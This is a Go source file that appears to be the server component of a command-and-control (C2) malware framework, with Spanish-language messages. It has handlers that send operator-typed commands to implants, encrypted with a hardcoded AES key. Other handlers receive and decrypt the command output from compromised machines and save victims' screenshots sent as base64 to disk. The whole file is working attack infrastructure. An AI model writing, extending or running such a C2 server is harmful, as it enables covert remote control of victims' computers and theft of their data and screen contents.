package c2server

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/fatih/color"
	"github.com/labstack/echo/v4"
	"io/ioutil"
	"net/http"
	"os"
)

func MainControll(c echo.Context) error {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("C2 >")
	comando, _ := reader.ReadString('\n')
	cifrado := EncryptAes(comando, "bnbCNCdYMWUqrzV65KWx4WWVUYqpKJ75")
	color.Red("Esperando comandos!")

	return c.String(http.StatusOK, cifrado)
}

func GetOutput(c echo.Context) error {
	reqbody, err := ioutil.ReadAll(c.Request().Body)
	CheckError(err)
	recover()
	output := DecryptAes(string(reqbody), "bnbCNCdYMWUqrzV65KWx4WWVUYqpKJ75")
	fmt.Println(output)
	return c.String(http.StatusOK, "Ok")
}

func Screenshot(c echo.Context) error {
	reqbody, err := ioutil.ReadAll(c.Request().Body)
	CheckError(err)
	recover()
	imgfile, err := base64.StdEncoding.DecodeString(string(reqbody))
	CheckError(err)
	recover()
	file, err := os.Create("tmp.png")
	CheckError(err)
	recover()
	defer file.Close()
	file.Write(imgfile)

	return c.String(http.StatusOK, "Recibido!")
}
